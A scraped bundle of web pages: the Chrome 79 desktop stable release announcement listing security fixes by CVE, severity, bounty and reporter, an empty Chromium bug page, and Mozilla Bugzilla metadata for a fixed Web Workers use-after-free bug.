=== Content from chromereleases.googleblog.com_b05cb592_20250121_003655.html ===


![](https://ad.doubleclick.net/ddm/activity/src=2542116;type=gblog;cat=googl0;ord=1?)

[![](https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_284x96dp.png)](https://chromereleases.googleblog.com/)
[## Chrome Releases](/.)

Release updates from the Chrome team

## [Stable Channel Update for Desktop](https://chromereleases.googleblog.com/2019/12/stable-channel-update-for-desktop.html "Stable Channel Update for Desktop")

Tuesday, December 10, 2019

The Chrome team is delighted to announce the promotion of Chrome 79 to the stable channel for Windows, Mac and Linux. This will roll out over the coming days/weeks.

Chrome 79.0.3945.79 contains a number of fixes and improvements -- a list of changes is available in the[log](https://chromium.googlesource.com/chromium/src/%2Blog/78.0.3904.108..79.0.3945.79?pretty=fuller&n=10000). Watch out for upcoming[Chrome](https://chrome.blogspot.com/) and[Chromium](https://blog.chromium.org/) blog posts about new features and big efforts delivered in 79.

**Security Fixes and Rewards**

Note: Access to bug details and links may be kept restricted until a majority of users are updated with a fix. We will also retain restrictions if the bug exists in a third party library that other projects similarly depend on, but haven’t yet fixed.

This update includes [51](https://bugs.chromium.org/p/chromium/issues/list?can=1&q=type%3Abug-security+os%3DAndroid%2Cios%2Clinux%2Cmac%2Cwindows%2Call+label%3ARelease-0-M79) security fixes. Below, we highlight fixes that were contributed by external researchers. Please see the [Chrome Security Page](https://sites.google.com/a/chromium.org/dev/Home/chromium-security) for more information.

[$20000][[1025067](https://crbug.com/1025067)] Critical CVE-2019-13725: Use after free in Bluetooth. Reported by Gengming Liu, Jianyu Chen at Tencent Keen Security Lab on 2019-11-15
[$TBD][[1027152](https://crbug.com/1027152)] Critical CVE-2019-13726: Heap buffer overflow in password manager. Reported by Sergei Glazunov of Google Project Zero on 2019-11-21
[$10000][[944619](https://crbug.com/944619)] High CVE-2019-13727: Insufficient policy enforcement in WebSockets. Reported by @piochu on 2019-03-21
[$7500][[1024758](https://crbug.com/1024758)] High CVE-2019-13728: Out of bounds write in V8. Reported by Rong Jian and Guang Gong of Alpha Lab, Qihoo 360 on 2019-11-14
[$5000][[1025489](https://crbug.com/1025489)] High CVE-2019-13729: Use after free in WebSockets. Reported by Zhe Jin（金哲），Luyao Liu(刘路遥) from Chengdu Security Response Center of Qihoo 360 Technology Co. Ltd on 2019-11-16
[$5000][[1028862](https://crbug.com/1028862)] High CVE-2019-13730: Type Confusion in V8. Reported by Soyeon Park and Wen Xu at SSLab, Georgia Tech on 2019-11-27
[$TBD][[1023817](https://crbug.com/1023817)] High CVE-2019-13732: Use after free in WebAudio. Reported by Sergei Glazunov of Google Project Zero on 2019-11-12
[$TBD][[1025466](https://crbug.com/1025466)] High CVE-2019-13734: Out of bounds write in SQLite. Reported by Wenxiang Qian of Tencent Blade Team on 2019-11-16
[$TBD][[1025468](https://crbug.com/1025468)] High CVE-2019-13735: Out of bounds write in V8. Reported by Gengming Liu and Zhen Feng from Tencent Keen Lab on 2019-11-16
[$TBD][[1028863](https://crbug.com/1028863)] High CVE-2019-13764: Type Confusion in V8. Reported by Soyeon Park and Wen Xu at SSLab, Georgia Tech on 2019-11-26
[$7500][[1020899](https://crbug.com/1020899)] Medium CVE-2019-13736: Integer overflow in PDFium. Reported by Anonymous on 2019-11-03
[$5000][[1013882](https://crbug.com/1013882)] Medium CVE-2019-13737: Insufficient policy enforcement in autocomplete. Reported by Mark Amery on 2019-10-12
[$5000][[1017441](https://crbug.com/1017441)] Medium CVE-2019-13738: Insufficient policy enforcement in navigation. Reported by Johnathan Norman and Daniel Clark of Microsoft Edge Team on 2019-10-23
[$3000][[824715](https://crbug.com/824715)] Medium CVE-2019-13739: Incorrect security UI in Omnibox. Reported by xisigr of Tencent's Xuanwu Lab on 2018-03-22
[$2000][[1005596](https://crbug.com/1005596)] Medium CVE-2019-13740: Incorrect security UI in sharing. Reported by Khalil Zhani on 2019-09-19
[$2000][[1011950](https://crbug.com/1011950)] Medium CVE-2019-13741: Insufficient validation of untrusted input in Blink. Reported by Michał Bentkowski of Securitum on 2019-10-07
[$2000][[1017564](https://crbug.com/1017564)] Medium CVE-2019-13742: Incorrect security UI in Omnibox. Reported by Khalil Zhani on 2019-10-24
[$1000][[754304](https://crbug.com/754304)] Medium CVE-2019-13743: Incorrect security UI in external protocol handling. Reported by Zhiyang Zeng of Tencent security platform department on 2017-08-10
[$1000][[853670](https://crbug.com/853670)] Medium CVE-2019-13744: Insufficient policy enforcement in cookies. Reported by Prakash (@1lastBr3ath) on 2018-06-18
[$500][[990867](https://crbug.com/990867)] Medium CVE-2019-13745: Insufficient policy enforcement in audio. Reported by Luan Herrera (@lbherrera\_) on 2019-08-05
[$500][[999932](https://crbug.com/999932)] Medium CVE-2019-13746: Insufficient policy enforcement in Omnibox. Reported by David Erceg on 2019-09-02
[$500][[1018528](https://crbug.com/1018528)] Medium CVE-2019-13747: Uninitialized Use in rendering. Reported by Ivan Popelyshev and André Bonatti on 2019-10-26
[$N/A][[993706](https://crbug.com/993706)] Medium CVE-2019-13748: Insufficient policy enforcement in developer tools. Reported by David Erceg on 2019-08-14
[$N/A][[1010765](https://crbug.com/1010765)] Medium CVE-2019-13749: Incorrect security UI in Omnibox. Reported by Khalil Zhani on 2019-10-03
[$TBD][[1025464](https://crbug.com/1025464)] Medium CVE-2019-13750: Insufficient data validation in SQLite. Reported by Wenxiang Qian of Tencent Blade Team on 2019-11-16
[$TBD][[1025465](https://crbug.com/1025465)] Medium CVE-2019-13751: Uninitialized Use in SQLite. Reported by Wenxiang Qian of Tencent Blade Team on 2019-11-16
[$TBD][[1025470](https://crbug.com/1025470)] Medium CVE-2019-13752: Out of bounds read in SQLite. Reported by Wenxiang Qian of Tencent Blade Team on 2019-11-16
[$TBD][[1025471](https://crbug.com/1025471)] Medium CVE-2019-13753: Out of bounds read in SQLite. Reported by Wenxiang Qian of Tencent Blade Team on 2019-11-16
[$500][[442579](https://crbug.com/442579)] Low CVE-2019-13754: Insufficient policy enforcement in extensions. Reported by Cody Crews on 2014-12-16
[$500][[696208](https://crbug.com/696208)] Low CVE-2019-13755: Insufficient policy enforcement in extensions. Reported by Masato Kinugawa on 2017-02-25
[$500][[708595](https://crbug.com/708595)] Low CVE-2019-13756: Incorrect security UI in printing. Reported by Khalil Zhani on 2017-04-05
[$500][[884693](https://crbug.com/884693)] Low CVE-2019-13757: Incorrect security UI in Omnibox. Reported by Khalil Zhani on 2018-09-17
[$500][[979441](https://crbug.com/979441)] Low CVE-2019-13758: Insufficient policy enforcement in navigation. Reported by Khalil Zhani on 2019-06-28
[$N/A][[901789](https://crbug.com/901789)] Low CVE-2019-13759: Incorrect security UI in interstitials. Reported by Wenxu Wu (@ma7h1as) of Tencent Security Xuanwu Lab on 2018-11-05
[$N/A][[1002687](https://crbug.com/1002687)] Low CVE-2019-13761: Incorrect security UI in Omnibox. Reported by Khalil Zhani on 2019-09-10
[$N/A][[1004212](https://crbug.com/1004212)] Low CVE-2019-13762: Insufficient policy enforcement in downloads. Reported by csanuragjain (@csanuragjain) on 2019-09-16
[$TBD][[1011600](https://crbug.com/1011600)] Low CVE-2019-13763: Insufficient policy enforcement in payments. Reported by weiwangpp93 on 2019-10-05

We would also like to thank all security researchers that worked with us during the development cycle to prevent security bugs from ever reaching the stable channel.

As usual, our ongoing internal security work was responsible for a wide range of fixes:

* [[1032080](https://crbug.com/1032080)] Various fixes from internal audits, fuzzing and other initiatives, including
* [$N/A][[1025089](https://crbug.com/1025089)] **High** CVE-2019-13722 Inappropriate implementation in WebRTC

Many of our security bugs are detected using [AddressSanitizer](https://code.google.com/p/address-sanitizer/wiki/AddressSanitizer), [MemorySanitizer](https://code.google.com/p/memory-sanitizer/wiki/MemorySanitizer), [UndefinedBehaviorSanitizer](https://www.chromium.org/developers/testing/undefinedbehaviorsanitizer), [Control Flow Integrity](https://sites.google.com/a/chromium.org/dev/developers/testing/control-flow-integrity), [libFuzzer](https://sites.google.com/a/chromium.org/dev/developers/testing/libfuzzer), or [AFL](https://github.com/google/afl).

Interested in switching release channels?  Find out how [here](https://www.chromium.org/getting-involved/dev-channel). If you find a new issue, please let us know by [filing a bug](https://crbug.com/). The [community help forum](https://productforums.google.com/forum/#!forum/chrome) is also a great place to reach out for help or learn about common issues.

Krishna Govind
Google Chrome

![Share on Twitter](https://www.gstatic.com/images/icons/material/system/2x/post_twitter_black_24dp.png)

![Share on Facebook](https://www.gstatic.com/images/icons/material/system/2x/post_facebook_black_24dp.png)

[Google](https://plus.google.com/112374322230920073195)
Labels:

[Desktop Update](https://chromereleases.googleblog.com/search/label/Desktop%20Update)
,
[Stable updates](https://chromereleases.googleblog.com/search/label/Stable%20updates)

[**](https://chromereleases.googleblog.com/)
[**](https://chromereleases.googleblog.com/2019/12/chrome-for-android-update.html "Newer Post")

[**](https://chromereleases.googleblog.com/2019/12/chrome-beta-for-android-update_10.html "Older Post")

![](data:image/png;base64...)
## Labels

**

* [Admin Console](https://chromereleases.googleblog.com/search/label/Admin%20Console)
  43
* [Android WebView](https://chromereleases.googleblog.com/search/label/Android%20WebView)
  19
* [Beta](https://chromereleases.googleblog.com/search/label/Beta)
  21
* [Beta update](https://chromereleases.googleblog.com/search/label/Beta%20update)
  4
* [Beta updates](https://chromereleases.googleblog.com/search/label/Beta%20updates)
  2033
* [chrome](https://chromereleases.googleblog.com/search/label/chrome)
  15
* [Chrome Dev for Android](https://chromereleases.googleblog.com/search/label/Chrome%20Dev%20for%20Android)
  134
* [Chrome for Android](https://chromereleases.googleblog.com/search/label/Chrome%20for%20Android)
  961
* [Chrome for iOS](https://chromereleases.googleblog.com/search/label/Chrome%20for%20iOS)
  386
* [Chrome for Meetings](https://chromereleases.googleblog.com/search/label/Chrome%20for%20Meetings)
  5
* [Chrome OS](https://chromereleases.googleblog.com/search/label/Chrome%20OS)
  1150
* [Chrome OS Flex](https://chromereleases.googleblog.com/search/label/Chrome%20OS%20Flex)
  23
* [Chrome OS Management](https://chromereleases.googleblog.com/search/label/Chrome%20OS%20Management)
  12
* [Chromecast Update](https://chromereleases.googleblog.com/search/label/Chromecast%20Update)
  6
* [ChromeOS](https://chromereleases.googleblog.com/search/label/ChromeOS)
  214
* [ChromeOS Flex](https://chromereleases.googleblog.com/search/label/ChromeOS%20Flex)
  211
* [Desktop Update](https://chromereleases.googleblog.com/search/label/Desktop%20Update)
  1130
* [dev update](https://chromereleases.googleblog.com/search/label/dev%20update)
  266
* [Dev updates](https://chromereleases.googleblog.com/search/label/Dev%20updates)
  1516
* [Early Stable Updates](https://chromereleases.googleblog.com/search/label/Early%20Stable%20Updates)
  50
* [Extended Stable updates](https://chromereleases.googleblog.com/search/label/Extended%20Stable%20updates)
  133
* [Flash Player update](https://chromereleases.googleblog.com/search/label/Flash%20Player%20update)
  5
* [Flex](https://chromereleases.googleblog.com/search/label/Flex)
  1
* [Hangouts Meet hardware](https://chromereleases.googleblog.com/search/label/Hangouts%20Meet%20hardware)
  5
* [LTS](https://chromereleases.googleblog.com/search/label/LTS)
  90
* [stable](https://chromereleases.googleblog.com/search/label/stable)
  11
* [Stable updates](https://chromereleases.googleblog.com/search/label/Stable%20updates)
  1257

**
## Archive

**

* **

  **
  [2025](https://chromereleases.googleblog.com/2025/)

  + [Jan](https://chromereleases.googleblog.com/2025/01/)

* **

  **
  [2024](https://chromereleases.googleblog.com/2024/)

  + [Dec](https://chromereleases.googleblog.com/2024/12/)
  + [Nov](https://chromereleases.googleblog.com/2024/11/)
  + [Oct](https://chromereleases.googleblog.com/2024/10/)
  + [Sep](https://chromereleases.googleblog.com/2024/09/)
  + [Aug](https://chromereleases.googleblog.com/2024/08/)
  + [Jul](https://chromereleases.googleblog.com/2024/07/)
  + [Jun](https://chromereleases.googleblog.com/2024/06/)
  + [May](https://chromereleases.googleblog.com/2024/05/)
  + [Apr](https://chromereleases.googleblog.com/2024/04/)
  + [Mar](https://chromereleases.googleblog.com/2024/03/)
  + [Feb](https://chromereleases.googleblog.com/2024/02/)
  + [Jan](https://chromereleases.googleblog.com/2024/01/)

* **

  **
  [2023](https://chromereleases.googleblog.com/2023/)

  + [Dec](https://chromereleases.googleblog.com/2023/12/)
  + [Nov](https://chromereleases.googleblog.com/2023/11/)
  + [Oct](https://chromereleases.googleblog.com/2023/10/)
  + [Sep](https://chromereleases.googleblog.com/2023/09/)
  + [Aug](https://chromereleases.googleblog.com/2023/08/)
  + [Jul](https://chromereleases.googleblog.com/2023/07/)
  + [Jun](https://chromereleases.googleblog.com/2023/06/)
  + [May](https://chromereleases.googleblog.com/2023/05/)
  + [Apr](https://chromereleases.googleblog.com/2023/04/)
  + [Mar](https://chromereleases.googleblog.com/2023/03/)
  + [Feb](https://chromereleases.googleblog.com/2023/02/)
  + [Jan](https://chromereleases.googleblog.com/2023/01/)

* **

  **
  [2022](https://chromereleases.googleblog.com/2022/)

  + [Dec](https://chromereleases.googleblog.com/2022/12/)
  + [Nov](https://chromereleases.googleblog.com/2022/11/)
  + [Oct](https://chromereleases.googleblog.com/2022/10/)
  + [Sep](https://chromereleases.googleblog.com/2022/09/)
  + [Aug](https://chromereleases.googleblog.com/2022/08/)
  + [Jul](https://chromereleases.googleblog.com/2022/07/)
  + [Jun](https://chromereleases.googleblog.com/2022/06/)
  + [May](https://chromereleases.googleblog.com/2022/05/)
  + [Apr](https://chromereleases.googleblog.com/2022/04/)
  + [Mar](https://chromereleases.googleblog.com/2022/03/)
  + [Feb](https://chromereleases.googleblog.com/2022/02/)
  + [Jan](https://chromereleases.googleblog.com/2022/01/)

* **

  **
  [2021](https://chromereleases.googleblog.com/2021/)

  + [Dec](https://chromereleases.googleblog.com/2021/12/)
  + [Nov](https://chromereleases.googleblog.com/2021/11/)
  + [Oct](https://chromereleases.googleblog.com/2021/10/)
  + [Sep](https://chromereleases.googleblog.com/2021/09/)
  + [Aug](https://chromereleases.googleblog.com/2021/08/)
  + [Jul](https://chromereleases.googleblog.com/2021/07/)
  + [Jun](https://chromereleases.googleblog.com/2021/06/)
  + [May](https://chromereleases.googleblog.com/2021/05/)
  + [Apr](https://chromereleases.googleblog.com/2021/04/)
  + [Mar](https://chromereleases.googleblog.com/2021/03/)
  + [Feb](https://chromereleases.googleblog.com/2021/02/)
  + [Jan](https://chromereleases.googleblog.com/2021/01/)

* **

  **
  [2020](https://chromereleases.googleblog.com/2020/)

  + [Dec](https://chromereleases.googleblog.com/2020/12/)
  + [Nov](https://chromereleases.googleblog.com/2020/11/)
  + [Oct](https://chromereleases.googleblog.com/2020/10/)
  + [Sep](https://chromereleases.googleblog.com/2020/09/)
  + [Aug](https://chromereleases.googleblog.com/2020/08/)
  + [Jul](https://chromereleases.googleblog.com/2020/07/)
  + [Jun](https://chromereleases.googleblog.com/2020/06/)
  + [May](https://chromereleases.googleblog.com/2020/05/)
  + [Apr](https://chromereleases.googleblog.com/2020/04/)
  + [Mar](https://chromereleases.googleblog.com/2020/03/)
  + [Feb](https://chromereleases.googleblog.com/2020/02/)
  + [Jan](https://chromereleases.googleblog.com/2020/01/)

* **

  **
  [2019](https://chromereleases.googleblog.com/2019/)

  + [Dec](https://chromereleases.googleblog.com/2019/12/)
  + [Nov](https://chromereleases.googleblog.com/2019/11/)
  + [Oct](https://chromereleases.googleblog.com/2019/10/)
  + [Sep](https://chromereleases.googleblog.com/2019/09/)
  + [Aug](https://chromereleases.googleblog.com/2019/08/)
  + [Jul](https://chromereleases.googleblog.com/2019/07/)
  + [Jun](https://chromereleases.googleblog.com/2019/06/)
  + [May](https://chromereleases.googleblog.com/2019/05/)
  + [Apr](https://chromereleases.googleblog.com/2019/04/)
  + [Mar](https://chromereleases.googleblog.com/2019/03/)
  + [Feb](https://chromereleases.googleblog.com/2019/02/)
  + [Jan](https://chromereleases.googleblog.com/2019/01/)

* **

  **
  [2018](https://chromereleases.googleblog.com/2018/)

  + [Dec](https://chromereleases.googleblog.com/2018/12/)
  + [Nov](https://chromereleases.googleblog.com/2018/11/)
  + [Oct](https://chromereleases.googleblog.com/2018/10/)
  + [Sep](https://chromereleases.googleblog.com/2018/09/)
  + [Aug](https://chromereleases.googleblog.com/2018/08/)
  + [Jul](https://chromereleases.googleblog.com/2018/07/)
  + [Jun](https://chromereleases.googleblog.com/2018/06/)
  + [May](https://chromereleases.googleblog.com/2018/05/)
  + [Apr](https://chromereleases.googleblog.com/2018/04/)
  + [Mar](https://chromereleases.googleblog.com/2018/03/)
  + [Feb](https://chromereleases.googleblog.com/2018/02/)
  + [Jan](https://chromereleases.googleblog.com/2018/01/)

* **

  **
  [2017](https://chromereleases.googleblog.com/2017/)

  + [Dec](https://chromereleases.googleblog.com/2017/12/)
  + [Nov](https://chromereleases.googleblog.com/2017/11/)
  + [Oct](https://chromereleases.googleblog.com/2017/10/)
  + [Sep](https://chromereleases.googleblog.com/2017/09/)
  + [Aug](https://chromereleases.googleblog.com/2017/08/)
  + [Jul](https://chromereleases.googleblog.com/2017/07/)
  + [Jun](https://chromereleases.googleblog.com/2017/06/)
  + [May](https://chromereleases.googleblog.com/2017/05/)
  + [Apr](https://chromereleases.googleblog.com/2017/04/)
  + [Mar](https://chromereleases.googleblog.com/2017/03/)
  + [Feb](https://chromereleases.googleblog.com/2017/02/)
  + [Jan](https://chromereleases.googleblog.com/2017/01/)

* **

  **
  [2016](https://chromereleases.googleblog.com/2016/)

  + [Dec](https://chromereleases.googleblog.com/2016/12/)
  + [Nov](https://chromereleases.googleblog.com/2016/11/)
  + [Oct](https://chromereleases.googleblog.com/2016/10/)
  + [Sep](https://chromereleases.googleblog.com/2016/09/)
  + [Aug](https://chromereleases.googleblog.com/2016/08/)
  + [Jul](https://chromereleases.googleblog.com/2016/07/)
  + [Jun](https://chromereleases.googleblog.com/2016/06/)
  + [May](https://chromereleases.googleblog.com/2016/05/)
  + [Apr](https://chromereleases.googleblog.com/2016/04/)
  + [Mar](https://chromereleases.googleblog.com/2016/03/)
  + [Feb](https://chromereleases.googleblog.com/2016/02/)
  + [Jan](https://chromereleases.googleblog.com/2016/01/)

* **

  **
  [2015](https://chromereleases.googleblog.com/2015/)

  + [Dec](https://chromereleases.googleblog.com/2015/12/)
  + [Nov](https://chromereleases.googleblog.com/2015/11/)
  + [Oct](https://chromereleases.googleblog.com/2015/10/)
  + [Sep](https://chromereleases.googleblog.com/2015/09/)
  + [Aug](https://chromereleases.googleblog.com/2015/08/)
  + [Jul](https://chromereleases.googleblog.com/2015/07/)
  + [Jun](https://chromereleases.googleblog.com/2015/06/)
  + [May](https://chromereleases.googleblog.com/2015/05/)
  + [Apr](https://chromereleases.googleblog.com/2015/04/)
  + [Mar](https://chromereleases.googleblog.com/2015/03/)
  + [Feb](https://chromereleases.googleblog.com/2015/02/)
  + [Jan](https://chromereleases.googleblog.com/2015/01/)

* **

  **
  [2014](https://chromereleases.googleblog.com/2014/)

  + [Dec](https://chromereleases.googleblog.com/2014/12/)
  + [Nov](https://chromereleases.googleblog.com/2014/11/)
  + [Oct](https://chromereleases.googleblog.com/2014/10/)
  + [Sep](https://chromereleases.googleblog.com/2014/09/)
  + [Aug](https://chromereleases.googleblog.com/2014/08/)
  + [Jul](https://chromereleases.googleblog.com/2014/07/)
  + [Jun](https://chromereleases.googleblog.com/2014/06/)
  + [May](https://chromereleases.googleblog.com/2014/05/)
  + [Apr](https://chromereleases.googleblog.com/2014/04/)
  + [Mar](https://chromereleases.googleblog.com/2014/03/)
  + [Feb](https://chromereleases.googleblog.com/2014/02/)
  + [Jan](https://chromereleases.googleblog.com/2014/01/)

* **

  **
  [2013](https://chromereleases.googleblog.com/2013/)

  + [Dec](https://chromereleases.googleblog.com/2013/12/)
  + [Nov](https://chromereleases.googleblog.com/2013/11/)
  + [Oct](https://chromereleases.googleblog.com/2013/10/)
  + [Sep](https://chromereleases.googleblog.com/2013/09/)
  + [Aug](https://chromereleases.googleblog.com/2013/08/)
  + [Jul](https://chromereleases.googleblog.com/2013/07/)
  + [Jun](https://chromereleases.googleblog.com/2013/06/)
  + [May](https://chromereleases.googleblog.com/2013/05/)
  + [Apr](https://chromereleases.googleblog.com/2013/04/)
  + [Mar](https://chromereleases.googleblog.com/2013/03/)
  + [Feb](https://chromereleases.googleblog.com/2013/02/)
  + [Jan](https://chromereleases.googleblog.com/2013/01/)

* **

  **
  [2012](https://chromereleases.googleblog.com/2012/)

  + [Dec](https://chromereleases.googleblog.com/2012/12/)
  + [Nov](https://chromereleases.googleblog.com/2012/11/)
  + [Oct](https://chromereleases.googleblog.com/2012/10/)
  + [Sep](https://chromereleases.googleblog.com/2012/09/)
  + [Aug](https://chromereleases.googleblog.com/2012/08/)
  + [Jul](https://chromereleases.googleblog.com/2012/07/)
  + [Jun](https://chromereleases.googleblog.com/2012/06/)
  + [May](https://chromereleases.googleblog.com/2012/05/)
  + [Apr](https://chromereleases.googleblog.com/2012/04/)
  + [Mar](https://chromereleases.googleblog.com/2012/03/)
  + [Feb](https://chromereleases.googleblog.com/2012/02/)
  + [Jan](https://chromereleases.googleblog.com/2012/01/)

* **

  **
  [2011](https://chromereleases.googleblog.com/2011/)

  + [Dec](https://chromereleases.googleblog.com/2011/12/)
  + [Nov](https://chromereleases.googleblog.com/2011/11/)
  + [Oct](https://chromereleases.googleblog.com/2011/10/)
  + [Sep](https://chromereleases.googleblog.com/2011/09/)
  + [Aug](https://chromereleases.googleblog.com/2011/08/)
  + [Jul](https://chromereleases.googleblog.com/2011/07/)
  + [Jun](https://chromereleases.googleblog.com/2011/06/)
  + [May](https://chromereleases.googleblog.com/2011/05/)
  + [Apr](https://chromereleases.googleblog.com/2011/04/)
  + [Mar](https://chromereleases.googleblog.com/2011/03/)
  + [Feb](https://chromereleases.googleblog.com/2011/02/)
  + [Jan](https://chromereleases.googleblog.com/2011/01/)

* **

  **
  [2010](https://chromereleases.googleblog.com/2010/)

  + [Dec](https://chromereleases.googleblog.com/2010/12/)
  + [Nov](https://chromereleases.googleblog.com/2010/11/)
  + [Oct](https://chromereleases.googleblog.com/2010/10/)
  + [Sep](https://chromereleases.googleblog.com/2010/09/)
  + [Aug](https://chromereleases.googleblog.com/2010/08/)
  + [Jul](https://chromereleases.googleblog.com/2010/07/)
  + [Jun](https://chromereleases.googleblog.com/2010/06/)
  + [May](https://chromereleases.googleblog.com/2010/05/)
  + [Apr](https://chromereleases.googleblog.com/2010/04/)
  + [Mar](https://chromereleases.googleblog.com/2010/03/)
  + [Feb](https://chromereleases.googleblog.com/2010/02/)
  + [Jan](https://chromereleases.googleblog.com/2010/01/)

* **

  **
  [2009](https://chromereleases.googleblog.com/2009/)

  + [Dec](https://chromereleases.googleblog.com/2009/12/)
  + [Nov](https://chromereleases.googleblog.com/2009/11/)
  + [Oct](https://chromereleases.googleblog.com/2009/10/)
  + [Sep](https://chromereleases.googleblog.com/2009/09/)
  + [Aug](https://chromereleases.googleblog.com/2009/08/)
  + [Jul](https://chromereleases.googleblog.com/2009/07/)
  + [Jun](https://chromereleases.googleblog.com/2009/06/)
  + [May](https://chromereleases.googleblog.com/2009/05/)
  + [Apr](https://chromereleases.googleblog.com/2009/04/)
  + [Mar](https://chromereleases.googleblog.com/2009/03/)
  + [Feb](https://chromereleases.googleblog.com/2009/02/)
  + [Jan](https://chromereleases.googleblog.com/2009/01/)

* **

  **
  [2008](https://chromereleases.googleblog.com/2008/)

  + [Dec](https://chromereleases.googleblog.com/2008/12/)
  + [Nov](https://chromereleases.googleblog.com/2008/11/)
  + [Oct](https://chromereleases.googleblog.com/2008/10/)
  + [Sep](https://chromereleases.googleblog.com/2008/09/)

Give us feedback in our
 [Product Forums](http://support.google.com/bin/static.py?hl=en&page=portal_groups.cs).

[![](data:image/png;base64...)](//www.google.com/)

* [Google](//www.google.com/)
* [Privacy](//www.google.com/policies/privacy/)
* [Terms](//www.google.com/policies/terms/)



=== Content from crbug.com_20d06050_20250121_024612.html ===



=== Content from bugzilla.mozilla.org_734d1967_20250121_024627.html ===


![](/static/v20250114.1/extensions/BMO/web/images/moz-fav-one-color-white-rgb.svg)

* [Mozilla Home](https://www.mozilla.org/)
* [Privacy](https://www.mozilla.org/privacy/websites/)
* [Cookies](https://www.mozilla.org/privacy/websites/#cookies)
* [Legal](https://www.mozilla.org/about/legal/)
# [Bugzilla](https://bugzilla.mozilla.org/home "Go to home page")

[Quick Search Tips](/page.cgi?id=quicksearch.html)
[Advanced Search](/query.cgi?format=advanced)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")

* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

* [Log In](/index.cgi?GoAheadAndLogIn=1)

   Log In with GitHub

  or

  Remember me

  [Create an Account](/createaccount.cgi)
  ·
  [Forgot Password](/index.cgi?GoAheadAndLogIn=1#forgot)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")
* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

Please enable JavaScript in your browser to use all the features on this site.

Copy Summary▾

* Markdown
* Markdown (bug number)
* Plain Text
* HTML

View ▾

* Reset Sections
* Expand All Sections
* Collapse All Sections
* History
* [JSON](/rest/bug/1546331)
* [XML](/show_bug.cgi?ctype=xml&id=1546331)

Closed
[Bug 1546331](/show_bug.cgi?id=1546331)
(CVE-2019-17008)

Opened 6 years ago
Closed 5 years ago

# Web Workers - Use After Free in RegisterDebuggerMainThread()

\*
[Summary:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#short_desc)

Web Workers - Use After Free in RegisterDebuggerMainThread()

## Categories

### (Core :: DOM: Workers, defect, P1)

[Product:](/describecomponents.cgi?product=Core)

Core
▾

Core
Shared components used by Firefox and other Mozilla software, including handling of Web content; Gecko, HTML, CSS, layout, DOM, scripts, images, networking, etc. Issues with web page layout probably go here, while Firefox user interface issues belong in the [Firefox](https://bugzilla.mozilla.org/describecomponents.cgi?product=Firefox) product. ([More info](https://wiki.mozilla.org/Modules/All#Core))
[See Open Bugs in This Product](/buglist.cgi?product=Core&bug_status=__open__)
[File New Bug in This Product](/enter_bug.cgi?product=Core)
Watch This Product

[Component:](/describecomponents.cgi?product=Core&component=DOM%3A%20Workers#DOM%3A%20Workers)

DOM: Workers
▾

Core :: DOM: Workers
This component covers the [Web Workers](https://developer.mozilla.org/En/DOM/Worker) implementation in Gecko.
[See Open Bugs in This Component](/buglist.cgi?product=Core&component=DOM%3A%20Workers&bug_status=__open__)
[Recently Fixed Bugs in This Component](/buglist.cgi?product=Core&component=DOM%3A%20Workers&chfield=resolution&chfieldfrom=-6m&chfieldvalue=FIXED&bug_status=__closed__)
[File New Bug in This Component](/enter_bug.cgi?product=Core&component=DOM%3A%20Workers)
Watch This Component

[Version:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#version)

68 Branch

[Platform:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#rep_platform)

Unspecified

Unspecified

[Type:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_type)

defect

[Priority:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#priority)

P1

[Severity:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_severity)

critical

Points:

---

## Tracking

### ()

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

RESOLVED
FIXED

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

RESOLVED

FIXED

Mark as Assigned

[Milestone:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#target_milestone)

mozilla72

Iteration:

---

[Project Flags:](https://wiki.mozilla.org/BMO/UserGuide#Project_Flags)

| Webcompat Score | --- |
| --- | --- |
| a11y-review | --- |
| Performance Impact | --- |
| Webcompat Priority | --- |
| Accessibility Severity | --- |

[Tracking Flags:](https://wiki.mozilla.org/BMO/UserGuide#Tracking_Flags)

|  | Tracking | Status |
| --- | --- | --- |
| firefox-esr60 | --- | [wontfix](/buglist.cgi?f1=cf_status_firefox_esr60&o1=equals&v1=wontfix) |
| firefox-esr68 | [71+](/buglist.cgi?f1=cf_tracking_firefox_esr68&o1=equals&v1=71%2B) | [fixed](/buglist.cgi?f1=cf_status_firefox_esr68&o1=equals&v1=fixed) |
| firefox67 | --- | [wontfix](/buglist.cgi?f1=cf_status_firefox67&o1=equals&v1=wontfix) |
| firefox68 | --- | [wontfix](/buglist.cgi?f1=cf_status_firefox68&o1=equals&v1=wontfix) |
| firefox69 | --- | [wontfix](/buglist.cgi?f1=cf_status_firefox69&o1=equals&v1=wontfix) |
| firefox70 | [+](/buglist.cgi?f1=cf_tracking_firefox70&o1=equals&v1=%2B) | [wontfix](/buglist.cgi?f1=cf_status_firefox70&o1=equals&v1=wontfix) |
| firefox71 | [+](/buglist.cgi?f1=cf_tracking_firefox71&o1=equals&v1=%2B) | [fixed](/buglist.cgi?f1=cf_status_firefox71&o1=equals&v1=fixed) |
| firefox72 | [+](/buglist.cgi?f1=cf_tracking_firefox72&o1=equals&v1=%2B) | [fixed](/buglist.cgi?f1=cf_status_firefox72&o1=equals&v1=fixed) |

|  | Tracking | Status |
| --- | --- | --- |
| relnote-firefox |  | --- |
| thunderbird\_esr115 | --- | --- |
| thunderbird\_esr128 | --- | --- |
| firefox-esr60 |  | wontfix |
| firefox-esr68 | 71+ | fixed |
| firefox-esr115 | --- | --- |
| firefox-esr128 | --- | --- |
| firefox67 |  | wontfix |
| firefox68 |  | wontfix |
| firefox69 |  | wontfix |
| firefox70 | + | wontfix |
| firefox71 | + | fixed |
| firefox72 | + | fixed |
| firefox134 | --- | --- |
| firefox135 | --- | --- |
